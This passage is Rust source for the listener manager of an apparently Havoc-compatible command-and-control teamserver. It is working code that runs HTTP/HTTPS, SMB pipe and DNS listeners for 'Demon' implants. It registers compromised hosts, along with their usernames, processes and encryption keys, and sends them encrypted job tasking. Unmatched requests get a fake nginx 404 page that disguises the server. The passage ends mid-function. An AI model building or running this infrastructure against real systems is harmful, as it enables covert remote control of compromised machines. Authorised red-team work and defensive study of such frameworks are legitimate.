//! Listener lifecycle management for the teamserver.

use std::collections::{BTreeMap, HashMap};
use std::io;
use std::net::IpAddr;
use std::sync::Arc;
use std::time::Instant;

use axum::body::{Body, to_bytes};
use axum::extract::State;
use axum::http::{HeaderMap, HeaderName, HeaderValue, Method, Request, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::routing::any;
use axum::{Json, Router};
use axum_server::tls_rustls::RustlsConfig;
use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
use interprocess::local_socket::tokio::Stream as LocalSocketStream;
use interprocess::local_socket::traits::tokio::Listener as _;
use interprocess::local_socket::{ListenerOptions, ToFsName as _, ToNsName as _};
#[cfg(unix)]
use interprocess::os::unix::local_socket::{AbstractNsUdSocket, FilesystemUdSocket};
#[cfg(windows)]
use interprocess::os::windows::local_socket::NamedPipe;
use red_cell_common::config::Profile;
use red_cell_common::crypto::{AGENT_IV_LENGTH, AGENT_KEY_LENGTH, encrypt_agent_data};
use red_cell_common::demon::{
    DEMON_MAGIC_VALUE, DemonCommand, DemonHeader, DemonMessage, DemonPackage, DemonProtocolError,
};
use red_cell_common::operator::{
    AgentEncryptionInfo as OperatorAgentEncryptionInfo, AgentInfo as OperatorAgentInfo,
    AgentPivotsInfo, AgentUpdateInfo, EventCode, ListenerErrorInfo, ListenerInfo, ListenerMarkInfo,
    Message, MessageHead, NameInfo, OperatorMessage,
};
use red_cell_common::tls::{
    TlsKeyAlgorithm, install_default_crypto_provider, resolve_tls_identity,
};
use red_cell_common::{
    DnsListenerConfig, ExternalListenerConfig, HttpListenerConfig, HttpListenerProxyConfig,
    HttpListenerResponseConfig, ListenerConfig, ListenerProtocol, SmbListenerConfig,
};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, UdpSocket};
use tokio::sync::{Mutex, RwLock};
use tokio::task::JoinHandle;
use tracing::debug;
use tracing::{info, warn};

use crate::{
    AgentRegistry, Database, DemonPacketParser, ListenerRepository, ListenerStatus,
    ParsedDemonPacket, PersistedListener, PersistedListenerState, TeamserverError, build_init_ack,
    events::EventBus,
};

/// Runtime state for a configured listener.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct ListenerSummary {
    /// Unique listener name.
    pub name: String,
    /// Listener transport protocol.
    pub protocol: ListenerProtocol,
    /// Persisted runtime state.
    pub state: PersistedListenerState,
    /// Full listener configuration.
    pub config: ListenerConfig,
}

impl From<PersistedListener> for ListenerSummary {
    fn from(value: PersistedListener) -> Self {
        Self {
            name: value.name,
            protocol: value.protocol,
            state: value.state,
            config: value.config,
        }
    }
}

impl ListenerSummary {
    /// Convert the summary into the Havoc-compatible operator payload shape.
    #[must_use]
    pub fn to_operator_info(&self) -> ListenerInfo {
        let mut info = ListenerInfo {
            name: Some(self.name.clone()),
            protocol: Some(operator_protocol_name(&self.config)),
            status: Some(operator_status(self.state.status).to_owned()),
            ..ListenerInfo::default()
        };

        match &self.config {
            ListenerConfig::Http(config) => {
                info.extra
                    .insert("Host".to_owned(), serde_json::Value::String(config.host_bind.clone()));
                info.extra.insert(
                    "Port".to_owned(),
                    serde_json::Value::String(config.port_bind.to_string()),
                );
                info.extra
                    .insert("Info".to_owned(), serde_json::Value::String(config.uris.join(", ")));
                info.extra.insert(
                    "Error".to_owned(),
                    self.state.last_error.clone().map_or_else(
                        || serde_json::Value::String(String::new()),
                        serde_json::Value::String,
                    ),
                );
                info.hosts = Some(config.hosts.join(", "));
                info.host_bind = Some(config.host_bind.clone());
                info.host_rotation = Some(config.host_rotation.clone());
                info.port_bind = Some(config.port_bind.to_string());
                info.port_conn = config.port_conn.map(|value| value.to_string());
                info.headers = Some(config.headers.join(", "));
                info.uris = Some(config.uris.join(", "));
                info.user_agent = config.user_agent.clone();
                if let Some(host_header) = &config.host_header {
                    info.extra.insert(
                        "HostHeader".to_owned(),
                        serde_json::Value::String(host_header.clone()),
                    );
                }
                info.proxy_enabled =
                    Some(config.proxy.as_ref().is_some_and(|proxy| proxy.enabled).to_string());
                info.proxy_type = config.proxy.as_ref().and_then(|proxy| proxy.proxy_type.clone());
                info.proxy_host = config.proxy.as_ref().map(|proxy| proxy.host.clone());
                info.proxy_port = config.proxy.as_ref().map(|proxy| proxy.port.to_string());
                info.proxy_username =
                    config.proxy.as_ref().and_then(|proxy| proxy.username.clone());
                info.proxy_password =
                    config.proxy.as_ref().and_then(|proxy| proxy.password.clone());
                info.secure = Some(config.secure.to_string());
                info.response_headers =
                    config.response.as_ref().map(|response| response.headers.join(", "));
            }
            ListenerConfig::Smb(config) => {
                info.extra.insert("Host".to_owned(), serde_json::Value::String(String::new()));
                info.extra.insert("Port".to_owned(), serde_json::Value::String(String::new()));
                info.extra
                    .insert("Info".to_owned(), serde_json::Value::String(config.pipe_name.clone()));
                info.extra.insert(
                    "Error".to_owned(),
                    self.state.last_error.clone().map_or_else(
                        || serde_json::Value::String(String::new()),
                        serde_json::Value::String,
                    ),
                );
                info.extra.insert(
                    "PipeName".to_owned(),
                    serde_json::Value::String(config.pipe_name.clone()),
                );
            }
            ListenerConfig::External(config) => {
                info.extra.insert("Host".to_owned(), serde_json::Value::String(String::new()));
                info.extra.insert("Port".to_owned(), serde_json::Value::String(String::new()));
                info.extra
                    .insert("Info".to_owned(), serde_json::Value::String(config.endpoint.clone()));
                info.extra.insert(
                    "Error".to_owned(),
                    self.state.last_error.clone().map_or_else(
                        || serde_json::Value::String(String::new()),
                        serde_json::Value::String,
                    ),
                );
                info.extra.insert(
                    "Endpoint".to_owned(),
                    serde_json::Value::String(config.endpoint.clone()),
                );
            }
            ListenerConfig::Dns(config) => {
                info.extra
                    .insert("Host".to_owned(), serde_json::Value::String(config.host_bind.clone()));
                info.extra.insert(
                    "Port".to_owned(),
                    serde_json::Value::String(config.port_bind.to_string()),
                );
                info.extra
                    .insert("Info".to_owned(), serde_json::Value::String(config.domain.clone()));
                info.extra.insert(
                    "Error".to_owned(),
                    self.state.last_error.clone().map_or_else(
                        || serde_json::Value::String(String::new()),
                        serde_json::Value::String,
                    ),
                );
                info.extra
                    .insert("Domain".to_owned(), serde_json::Value::String(config.domain.clone()));
                info.extra.insert(
                    "RecordTypes".to_owned(),
                    serde_json::Value::String(config.record_types.join(",")),
                );
                info.host_bind = Some(config.host_bind.clone());
                info.port_bind = Some(config.port_bind.to_string());
            }
        }

        info
    }
}

/// Request body used by REST listener mark operations.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct ListenerMarkRequest {
    /// Requested mark value such as `start` or `stop`.
    pub mark: String,
}

/// Errors returned by [`ListenerManager`].
#[derive(Debug, thiserror::Error)]
pub enum ListenerManagerError {
    /// Listener persistence failed.
    #[error("{0}")]
    Database(#[from] TeamserverError),
    /// The requested listener already exists.
    #[error("listener `{name}` already exists")]
    DuplicateListener { name: String },
    /// The requested listener could not be found.
    #[error("listener `{name}` not found")]
    ListenerNotFound { name: String },
    /// The listener is already running.
    #[error("listener `{name}` is already running")]
    ListenerAlreadyRunning { name: String },
    /// The listener is not currently running.
    #[error("listener `{name}` is not running")]
    ListenerNotRunning { name: String },
    /// The operator payload could not be converted into a valid listener config.
    #[error("invalid listener configuration: {message}")]
    InvalidConfig { message: String },
    /// A listener runtime could not bind or initialize.
    #[error("failed to start listener `{name}`: {message}")]
    StartFailed { name: String, message: String },
    /// The WebSocket mark command used an unsupported action.
    #[error("unsupported listener mark `{mark}`")]
    UnsupportedMark { mark: String },
}

impl IntoResponse for ListenerManagerError {
    fn into_response(self) -> Response {
        let status = match self {
            Self::DuplicateListener { .. } => StatusCode::CONFLICT,
            Self::ListenerNotFound { .. } => StatusCode::NOT_FOUND,
            Self::ListenerAlreadyRunning { .. } | Self::ListenerNotRunning { .. } => {
                StatusCode::CONFLICT
            }
            Self::InvalidConfig { .. } | Self::UnsupportedMark { .. } => StatusCode::BAD_REQUEST,
            Self::StartFailed { .. } => StatusCode::UNPROCESSABLE_ENTITY,
            Self::Database(_) => StatusCode::INTERNAL_SERVER_ERROR,
        };

        (status, Json(serde_json::json!({ "error": self.to_string() }))).into_response()
    }
}

/// Tracks persisted listeners and their active runtime tasks.
#[derive(Clone, Debug)]
pub struct ListenerManager {
    database: Database,
    agent_registry: AgentRegistry,
    events: EventBus,
    active_handles: Arc<RwLock<BTreeMap<String, JoinHandle<()>>>>,
    operations: Arc<Mutex<()>>,
}

impl ListenerManager {
    /// Build a listener manager backed by `database`.
    #[must_use]
    pub fn new(database: Database, agent_registry: AgentRegistry, events: EventBus) -> Self {
        Self {
            database,
            agent_registry,
            events,
            active_handles: Arc::new(RwLock::new(BTreeMap::new())),
            operations: Arc::new(Mutex::new(())),
        }
    }

    /// Return the listener persistence repository used by the manager.
    #[must_use]
    pub fn repository(&self) -> ListenerRepository {
        self.database.listeners()
    }

    /// Return the in-memory agent registry used by active listeners.
    #[must_use]
    pub fn agent_registry(&self) -> AgentRegistry {
        self.agent_registry.clone()
    }

    /// Create a persisted listener configuration in the stopped state.
    pub async fn create(
        &self,
        config: ListenerConfig,
    ) -> Result<ListenerSummary, ListenerManagerError> {
        let _guard = self.operations.lock().await;
        let repository = self.repository();

        if repository.exists(config.name()).await? {
            return Err(ListenerManagerError::DuplicateListener { name: config.name().to_owned() });
        }

        repository.create(&config).await?;
        self.summary(config.name()).await
    }

    /// Replace an existing listener configuration.
    pub async fn update(
        &self,
        config: ListenerConfig,
    ) -> Result<ListenerSummary, ListenerManagerError> {
        let _guard = self.operations.lock().await;
        let repository = self.repository();
        let existing = repository.get(config.name()).await?.ok_or_else(|| {
            ListenerManagerError::ListenerNotFound { name: config.name().to_owned() }
        })?;

        let was_running = existing.state.status == ListenerStatus::Running;
        if was_running {
            self.stop_locked(config.name()).await?;
        }

        repository.update(&config).await?;
        repository.set_state(config.name(), ListenerStatus::Stopped, None).await?;

        if was_running {
            match self.start_locked(config.name()).await {
                Ok(summary) => return Ok(summary),
                Err(error) => return Err(error),
            }
        }

        self.summary(config.name()).await
    }

    /// Start the named listener runtime.
    pub async fn start(&self, name: &str) -> Result<ListenerSummary, ListenerManagerError> {
        let _guard = self.operations.lock().await;
        self.start_locked(name).await
    }

    /// Stop the named listener runtime.
    pub async fn stop(&self, name: &str) -> Result<ListenerSummary, ListenerManagerError> {
        let _guard = self.operations.lock().await;
        self.stop_locked(name).await
    }

    /// Delete the named listener, stopping it first if needed.
    pub async fn delete(&self, name: &str) -> Result<(), ListenerManagerError> {
        let _guard = self.operations.lock().await;
        let repository = self.repository();
        let Some(listener) = repository.get(name).await? else {
            return Err(ListenerManagerError::ListenerNotFound { name: name.to_owned() });
        };

        if listener.state.status == ListenerStatus::Running {
            let _ = self.stop_locked(name).await?;
        }

        repository.delete(name).await?;
        self.active_handles.write().await.remove(name);
        Ok(())
    }

    /// Return the current persisted summary for `name`.
    pub async fn summary(&self, name: &str) -> Result<ListenerSummary, ListenerManagerError> {
        self.repository()
            .get(name)
            .await?
            .map(Into::into)
            .ok_or_else(|| ListenerManagerError::ListenerNotFound { name: name.to_owned() })
    }

    /// Return every persisted listener summary.
    pub async fn list(&self) -> Result<Vec<ListenerSummary>, ListenerManagerError> {
        Ok(self.repository().list().await?.into_iter().map(Into::into).collect())
    }

    /// Ensure listeners declared in the YAOTL profile exist in the database.
    pub async fn sync_profile(&self, profile: &Profile) -> Result<(), ListenerManagerError> {
        for config in profile_listener_configs(profile) {
            match self.create(config.clone()).await {
                Ok(_) => {}
                Err(ListenerManagerError::DuplicateListener { .. }) => {
                    let _ = self.update(config).await?;
                }
                Err(error) => return Err(error),
            }
        }

        Ok(())
    }

    /// Start listeners that were last persisted in the running state.
    pub async fn restore_running(&self) -> Result<(), ListenerManagerError> {
        let listeners = self.repository().list().await?;

        for listener in listeners {
            if listener.state.status == ListenerStatus::Running {
                let _ = self.start(&listener.name).await?;
            }
        }

        Ok(())
    }

    async fn start_locked(&self, name: &str) -> Result<ListenerSummary, ListenerManagerError> {
        let repository = self.repository();
        let listener = repository
            .get(name)
            .await?
            .ok_or_else(|| ListenerManagerError::ListenerNotFound { name: name.to_owned() })?;

        if self.active_handles.read().await.contains_key(name) {
            return Err(ListenerManagerError::ListenerAlreadyRunning { name: name.to_owned() });
        }

        match self.spawn_listener_runtime(&listener.config).await {
            Ok(handle) => {
                self.active_handles.write().await.insert(name.to_owned(), handle);
                repository.set_state(name, ListenerStatus::Running, None).await?;
                info!(listener = name, protocol = %listener.protocol, "listener started");
                self.summary(name).await
            }
            Err(error) => {
                let error_text = error.to_string();
                repository
                    .set_state(name, ListenerStatus::Error, Some(error_text.as_str()))
                    .await?;
                warn!(listener = name, error = %error_text, "listener failed to start");
                Err(ListenerManagerError::StartFailed {
                    name: name.to_owned(),
                    message: error_text,
                })
            }
        }
    }

    async fn stop_locked(&self, name: &str) -> Result<ListenerSummary, ListenerManagerError> {
        let repository = self.repository();

        if repository.get(name).await?.is_none() {
            return Err(ListenerManagerError::ListenerNotFound { name: name.to_owned() });
        }

        let Some(handle) = self.active_handles.write().await.remove(name) else {
            return Err(ListenerManagerError::ListenerNotRunning { name: name.to_owned() });
        };

        handle.abort();
        let _ = handle.await;
        repository.set_state(name, ListenerStatus::Stopped, None).await?;
        info!(listener = name, "listener stopped");
        self.summary(name).await
    }
}

const DEFAULT_FAKE_404_BODY: &str =
    include_str!("../../../src/Havoc/teamserver/pkg/handlers/404.html");
const DEFAULT_HTTP_METHOD: &str = "POST";
const MINIMUM_DEMON_CALLBACK_BYTES: usize = DemonHeader::SERIALIZED_LEN + 8;
const SMB_PIPE_PREFIX: &str = r"\\.\pipe\";
const HEADER_VALIDATION_IGNORES: [&str; 2] = ["connection", "accept-encoding"];

#[derive(Clone, Debug)]
struct HttpListenerState {
    config: HttpListenerConfig,
    registry: AgentRegistry,
    parser: DemonPacketParser,
    events: EventBus,
    method: Method,
    required_headers: Vec<ExpectedHeader>,
    response_headers: Vec<(HeaderName, HeaderValue)>,
    response_body: Arc<[u8]>,
    default_fake_404_body: Arc<[u8]>,
}

#[derive(Clone, Debug)]
struct ExpectedHeader {
    name: HeaderName,
    expected_value: String,
}

#[derive(Clone, Debug)]
struct SmbListenerState {
    config: SmbListenerConfig,
    registry: AgentRegistry,
    parser: DemonPacketParser,
    events: EventBus,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct ProcessedDemonResponse {
    agent_id: u32,
    payload: Vec<u8>,
}

impl HttpListenerState {
    fn build(
        config: &HttpListenerConfig,
        registry: AgentRegistry,
        events: EventBus,
    ) -> Result<Self, ListenerManagerError> {
        let method = parse_method(config)?;
        let required_headers = config
            .headers
            .iter()
            .filter_map(|header| parse_expected_header(header, &config.name).transpose())
            .collect::<Result<Vec<_>, _>>()?;
        let response_headers = config
            .response
            .as_ref()
            .map_or(Ok(Vec::new()), |response| parse_response_headers(response, &config.name))?;
        let response_body = config
            .response
            .as_ref()
            .and_then(|response| response.body.as_deref())
            .unwrap_or_default()
            .as_bytes()
            .to_vec()
            .into();

        Ok(Self {
            config: config.clone(),
            registry: registry.clone(),
            parser: DemonPacketParser::new(registry),
            events,
            method,
            required_headers,
            response_headers,
            response_body,
            default_fake_404_body: DEFAULT_FAKE_404_BODY.as_bytes().to_vec().into(),
        })
    }

    fn fake_404_response(&self) -> Response {
        let body = if self.response_body.is_empty() {
            self.default_fake_404_body.clone()
        } else {
            self.response_body.clone()
        };

        let mut response =
            build_response(StatusCode::NOT_FOUND, body.as_ref(), &self.response_headers);
        let headers = response.headers_mut();
        set_default_header(headers, "server", "nginx");
        set_default_header(headers, "content-type", "text/html");
        set_default_header(headers, "x-havoc", "true");
        response
    }

    fn callback_placeholder_response(&self) -> Response {
        build_response(StatusCode::OK, self.response_body.as_ref(), &self.response_headers)
    }

    fn callback_bytes_response(&self, body: &[u8]) -> Response {
        build_response(StatusCode::OK, body, &self.response_headers)
    }
}

impl SmbListenerState {
    fn build(config: &SmbListenerConfig, registry: AgentRegistry, events: EventBus) -> Self {
        Self {
            config: config.clone(),
            registry: registry.clone(),
            parser: DemonPacketParser::new(registry),
            events,
        }
    }
}

/// Convert a Havoc operator listener payload into a shared listener config.
pub fn listener_config_from_operator(
    info: &ListenerInfo,
) -> Result<ListenerConfig, ListenerManagerError> {
    let name = required_field("Name", info.name.as_deref())?;
    let protocol = required_field("Protocol", info.protocol.as_deref())?;

    match ListenerProtocol::try_from_str(protocol) {
        Ok(ListenerProtocol::Http) => Ok(ListenerConfig::from(HttpListenerConfig {
            name: name.to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: split_csv(info.hosts.as_deref()),
            host_bind: required_field("HostBind", info.host_bind.as_deref())?.to_owned(),
            host_rotation: required_field("HostRotation", info.host_rotation.as_deref())?
                .to_owned(),
            port_bind: parse_u16("PortBind", info.port_bind.as_deref())?,
            port_conn: parse_optional_u16("PortConn", info.port_conn.as_deref())?,
            method: None,
            behind_redirector: false,
            user_agent: optional_trimmed(info.user_agent.as_deref()),
            headers: split_csv(info.headers.as_deref()),
            uris: split_csv(info.uris.as_deref()),
            host_header: info
                .extra
                .get("HostHeader")
                .and_then(serde_json::Value::as_str)
                .and_then(|value| optional_trimmed(Some(value))),
            secure: parse_bool("Secure", info.secure.as_deref()).unwrap_or(false),
            cert: None,
            response: info.response_headers.as_deref().map(|headers| HttpListenerResponseConfig {
                headers: split_csv(Some(headers)),
                body: None,
            }),
            proxy: proxy_from_operator(info)?,
        })),
        Ok(ListenerProtocol::Smb) => Ok(ListenerConfig::from(SmbListenerConfig {
            name: name.to_owned(),
            pipe_name: required_extra_string(info, "PipeName")?,
            kill_date: None,
            working_hours: None,
        })),
        Ok(ListenerProtocol::External) => Ok(ListenerConfig::from(ExternalListenerConfig {
            name: name.to_owned(),
            endpoint: required_extra_string(info, "Endpoint")?,
        })),
        Ok(ListenerProtocol::Dns) => Ok(ListenerConfig::from(DnsListenerConfig {
            name: name.to_owned(),
            host_bind: info
                .host_bind
                .as_deref()
                .and_then(|value| optional_trimmed(Some(value)))
                .unwrap_or_else(|| "0.0.0.0".to_owned()),
            port_bind: parse_u16("PortBind", info.port_bind.as_deref())?,
            domain: required_extra_string(info, "Domain")?,
            record_types: split_csv(
                info.extra.get("RecordTypes").and_then(serde_json::Value::as_str),
            ),
            kill_date: None,
            working_hours: None,
        })),
        Err(error) => Err(ListenerManagerError::InvalidConfig { message: error.to_string() }),
    }
}

/// Return `true` when the operator payload requests the listener be started immediately.
#[must_use]
pub fn operator_requests_start(info: &ListenerInfo) -> bool {
    info.status.as_deref().is_some_and(|status| {
        status.eq_ignore_ascii_case("online") || status.eq_ignore_ascii_case("start")
    })
}

/// Convert a listener lifecycle action into a Havoc-compatible event payload.
#[must_use]
pub fn listener_event_for_action(
    user: &str,
    summary: &ListenerSummary,
    action: ListenerEventAction,
) -> OperatorMessage {
    match action {
        ListenerEventAction::Created => OperatorMessage::ListenerNew(Message {
            head: listener_message_head(user),
            info: summary.to_operator_info(),
        }),
        ListenerEventAction::Updated => OperatorMessage::ListenerEdit(Message {
            head: listener_message_head(user),
            info: summary.to_operator_info(),
        }),
        ListenerEventAction::Started => OperatorMessage::ListenerMark(Message {
            head: listener_message_head(user),
            info: ListenerMarkInfo { name: summary.name.clone(), mark: "Online".to_owned() },
        }),
        ListenerEventAction::Stopped => OperatorMessage::ListenerMark(Message {
            head: listener_message_head(user),
            info: ListenerMarkInfo { name: summary.name.clone(), mark: "Offline".to_owned() },
        }),
    }
}

/// Convert a listener error into a Havoc-compatible event payload.
#[must_use]
pub fn listener_error_event(
    user: &str,
    name: &str,
    error: &ListenerManagerError,
) -> OperatorMessage {
    OperatorMessage::ListenerError(Message {
        head: listener_message_head(user),
        info: ListenerErrorInfo { error: error.to_string(), name: name.to_owned() },
    })
}

/// Convert a deletion event into a Havoc-compatible operator payload.
#[must_use]
pub fn listener_removed_event(user: &str, name: &str) -> OperatorMessage {
    OperatorMessage::ListenerRemove(Message {
        head: listener_message_head(user),
        info: NameInfo { name: name.to_owned() },
    })
}

/// The lifecycle action represented by an operator or REST request.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ListenerEventAction {
    /// A new listener was created.
    Created,
    /// An existing listener was updated.
    Updated,
    /// A listener was started.
    Started,
    /// A listener was stopped.
    Stopped,
}

/// Parse a WebSocket listener mark value into a lifecycle action.
pub fn action_from_mark(mark: &str) -> Result<ListenerEventAction, ListenerManagerError> {
    if mark.eq_ignore_ascii_case("online")
        || mark.eq_ignore_ascii_case("start")
        || mark.eq_ignore_ascii_case("running")
    {
        Ok(ListenerEventAction::Started)
    } else if mark.eq_ignore_ascii_case("offline")
        || mark.eq_ignore_ascii_case("stop")
        || mark.eq_ignore_ascii_case("stopped")
    {
        Ok(ListenerEventAction::Stopped)
    } else {
        Err(ListenerManagerError::UnsupportedMark { mark: mark.to_owned() })
    }
}

fn listener_message_head(user: &str) -> MessageHead {
    MessageHead {
        event: EventCode::Listener,
        user: user.to_owned(),
        timestamp: String::new(),
        one_time: String::new(),
    }
}

fn operator_status(status: ListenerStatus) -> &'static str {
    match status {
        ListenerStatus::Running => "Online",
        ListenerStatus::Created | ListenerStatus::Stopped | ListenerStatus::Error => "Offline",
    }
}

fn operator_protocol_name(config: &ListenerConfig) -> String {
    match config {
        ListenerConfig::Http(config) if config.secure => "Https".to_owned(),
        ListenerConfig::Dns(_) => "Dns".to_owned(),
        _ => config.protocol().as_str().to_owned(),
    }
}

fn profile_listener_configs(profile: &Profile) -> Vec<ListenerConfig> {
    let mut listeners = Vec::new();
    listeners.extend(profile.listeners.http.iter().cloned().map(|config| {
        ListenerConfig::from(HttpListenerConfig {
            name: config.name,
            kill_date: config.kill_date,
            working_hours: config.working_hours,
            hosts: config.hosts,
            host_bind: config.host_bind,
            host_rotation: config.host_rotation,
            port_bind: config.port_bind,
            port_conn: config.port_conn,
            method: config.method,
            behind_redirector: profile.demon.trust_x_forwarded_for,
            user_agent: config.user_agent,
            headers: config.headers,
            uris: config.uris,
            host_header: None,
            secure: config.secure,
            cert: config
                .cert
                .map(|cert| red_cell_common::ListenerTlsConfig { cert: cert.cert, key: cert.key }),
            response: config.response.map(|response| HttpListenerResponseConfig {
                headers: response.headers,
                body: response.body,
            }),
            proxy: config.proxy.map(|proxy| HttpListenerProxyConfig {
                enabled: true,
                proxy_type: Some("http".to_owned()),
                host: proxy.host,
                port: proxy.port,
                username: proxy.username,
                password: proxy.password,
            }),
        })
    }));
    listeners.extend(profile.listeners.smb.iter().cloned().map(|config| {
        ListenerConfig::from(SmbListenerConfig {
            name: config.name,
            pipe_name: config.pipe_name,
            kill_date: config.kill_date,
            working_hours: config.working_hours,
        })
    }));
    listeners.extend(profile.listeners.external.iter().cloned().map(|config| {
        ListenerConfig::from(ExternalListenerConfig {
            name: config.name,
            endpoint: config.endpoint,
        })
    }));
    listeners.extend(profile.listeners.dns.iter().cloned().map(|config| {
        ListenerConfig::from(DnsListenerConfig {
            name: config.name,
            host_bind: config.host_bind,
            port_bind: config.port_bind,
            domain: config.domain,
            record_types: config.record_types,
            kill_date: config.kill_date,
            working_hours: config.working_hours,
        })
    }));
    listeners
}

async fn spawn_http_listener_runtime(
    config: &HttpListenerConfig,
    registry: AgentRegistry,
    events: EventBus,
) -> Result<JoinHandle<()>, ListenerManagerError> {
    let state = Arc::new(HttpListenerState::build(config, registry, events)?);
    let address = format!("{}:{}", config.host_bind, config.port_bind);
    let listener = TcpListener::bind(address.as_str()).await.map_err(|error| {
        ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to bind {address}: {error}"),
        }
    })?;
    let std_listener = listener.into_std().map_err(|error| ListenerManagerError::StartFailed {
        name: config.name.clone(),
        message: format!("failed to convert bound socket {address} into std listener: {error}"),
    })?;
    let router = Router::new().fallback(any(http_listener_handler)).with_state(state.clone());

    if config.secure {
        install_default_crypto_provider();
        let tls_config = build_http_tls_config(config).await?;
        let server = axum_server::from_tcp_rustls(std_listener, tls_config).map_err(|error| {
            ListenerManagerError::StartFailed {
                name: config.name.clone(),
                message: format!("failed to start HTTPS listener on {address}: {error}"),
            }
        })?;

        Ok(tokio::spawn(async move {
            if let Err(error) = server.serve(router.into_make_service()).await {
                warn!(listener = %state.config.name, %error, "https listener exited");
            }
        }))
    } else {
        let server = axum_server::from_tcp(std_listener).map_err(|error| {
            ListenerManagerError::StartFailed {
                name: config.name.clone(),
                message: format!("failed to start HTTP listener on {address}: {error}"),
            }
        })?;

        Ok(tokio::spawn(async move {
            if let Err(error) = server.serve(router.into_make_service()).await {
                warn!(listener = %state.config.name, %error, "http listener exited");
            }
        }))
    }
}

fn agent_new_event(
    listener_name: &str,
    magic_value: u32,
    agent: &red_cell_common::AgentInfo,
) -> OperatorMessage {
    OperatorMessage::AgentNew(Box::new(Message {
        head: MessageHead {
            event: EventCode::Session,
            user: "teamserver".to_owned(),
            timestamp: agent.last_call_in.clone(),
            one_time: "true".to_owned(),
        },
        info: OperatorAgentInfo {
            active: agent.active.to_string(),
            background_check: false,
            domain_name: agent.domain_name.clone(),
            elevated: agent.elevated,
            encryption: OperatorAgentEncryptionInfo {
                aes_key: agent.encryption.aes_key.clone(),
                aes_iv: agent.encryption.aes_iv.clone(),
            },
            internal_ip: agent.internal_ip.clone(),
            external_ip: agent.external_ip.clone(),
            first_call_in: agent.first_call_in.clone(),
            last_call_in: agent.last_call_in.clone(),
            hostname: agent.hostname.clone(),
            listener: listener_name.to_owned(),
            magic_value: format!("{magic_value:08x}"),
            name_id: agent.name_id(),
            os_arch: agent.os_arch.clone(),
            os_build: String::new(),
            os_version: agent.os_version.clone(),
            pivots: AgentPivotsInfo::default(),
            port_fwds: Vec::new(),
            process_arch: agent.process_arch.clone(),
            process_name: agent.process_name.clone(),
            process_pid: agent.process_pid.to_string(),
            process_ppid: agent.process_ppid.to_string(),
            process_path: agent.process_name.clone(),
            reason: agent.reason.clone(),
            note: agent.note.clone(),
            sleep_delay: Value::from(agent.sleep_delay),
            sleep_jitter: Value::from(agent.sleep_jitter),
            kill_date: agent.kill_date.map_or(Value::Null, Value::from),
            working_hours: agent.working_hours.map_or(Value::Null, Value::from),
            socks_cli: Vec::new(),
            socks_cli_mtx: None,
            socks_svr: Vec::new(),
            tasked_once: false,
            username: agent.username.clone(),
            pivot_parent: String::new(),
        },
    }))
}

fn agent_update_event(agent: &red_cell_common::AgentInfo) -> OperatorMessage {
    OperatorMessage::AgentUpdate(Message {
        head: MessageHead {
            event: EventCode::Session,
            user: "teamserver".to_owned(),
            timestamp: agent.last_call_in.clone(),
            one_time: String::new(),
        },
        info: AgentUpdateInfo { agent_id: agent.name_id(), marked: "Alive".to_owned() },
    })
}

async fn serialize_job_packages(
    registry: &AgentRegistry,
    agent_id: u32,
    jobs: Vec<crate::Job>,
) -> Result<Vec<u8>, ListenerManagerError> {
    let (key, iv) = decode_agent_crypto(registry, agent_id).await?;
    let mut packages = Vec::with_capacity(jobs.len());

    for job in jobs {
        let payload = if job.payload.is_empty() {
            Vec::new()
        } else {
            encrypt_agent_data(&key, &iv, &job.payload)
        };
        packages.push(DemonPackage {
            command_id: job.command,
            request_id: job.request_id,
            payload,
        });
    }

    DemonMessage::new(packages).to_bytes().map_err(callback_protocol_error)
}

async fn decode_agent_crypto(
    registry: &AgentRegistry,
    agent_id: u32,
) -> Result<([u8; AGENT_KEY_LENGTH], [u8; AGENT_IV_LENGTH]), ListenerManagerError> {
    let encryption = registry.encryption(agent_id).await?;
    let key = decode_fixed(agent_id, "aes_key", encryption.aes_key.as_bytes(), AGENT_KEY_LENGTH)?;
    let iv = decode_fixed(agent_id, "aes_iv", encryption.aes_iv.as_bytes(), AGENT_IV_LENGTH)?;
    Ok((key, iv))
}

fn callback_protocol_error(error: DemonProtocolError) -> ListenerManagerError {
    ListenerManagerError::InvalidConfig {
        message: format!("failed to serialize queued job payload: {error}"),
    }
}

async fn build_callback_response(
    listener_name: &str,
    registry: &AgentRegistry,
    events: &EventBus,
    agent_id: u32,
    packages: Vec<crate::DemonCallbackPackage>,
) -> Result<Vec<u8>, ListenerManagerError> {
    let mut requested_jobs = false;

    for package in packages {
        match package.command() {
            Ok(DemonCommand::CommandGetJob) => {
                requested_jobs = true;
            }
            Ok(DemonCommand::CommandCheckin) => {
                let timestamp = OffsetDateTime::now_utc().format(&Rfc3339).map_err(|error| {
                    ListenerManagerError::InvalidConfig {
                        message: format!("failed to format callback timestamp: {error}"),
                    }
                })?;
                let agent = registry.set_last_call_in(agent_id, timestamp).await?;
                events.broadcast(agent_update_event(&agent));
            }
            Ok(command) => {
                debug!(
                    listener = listener_name,
                    agent_id = format_args!("{agent_id:08X}"),
                    ?command,
                    "ignoring unhandled demon callback command"
                );
            }
            Err(error) => {
                warn!(
                    listener = listener_name,
                    agent_id = format_args!("{agent_id:08X}"),
                    %error,
                    command_id = package.command_id,
                    "ignoring unknown demon callback command"
                );
            }
        }
    }

    if !requested_jobs {
        return Ok(Vec::new());
    }

    let jobs = registry.dequeue_jobs(agent_id).await?;
    if jobs.is_empty() {
        return Ok(Vec::new());
    }

    serialize_job_packages(registry, agent_id, jobs).await
}

async fn process_demon_transport(
    listener_name: &str,
    registry: &AgentRegistry,
    parser: &DemonPacketParser,
    events: &EventBus,
    body: &[u8],
    external_ip: String,
) -> Result<ProcessedDemonResponse, ListenerManagerError> {
    match parser.parse(body, external_ip).await {
        Ok(ParsedDemonPacket::Init(init)) => {
            let response =
                build_init_ack(init.agent.agent_id, &init.agent.encryption).map_err(|error| {
                    ListenerManagerError::InvalidConfig {
                        message: format!("failed to build demon init ack: {error}"),
                    }
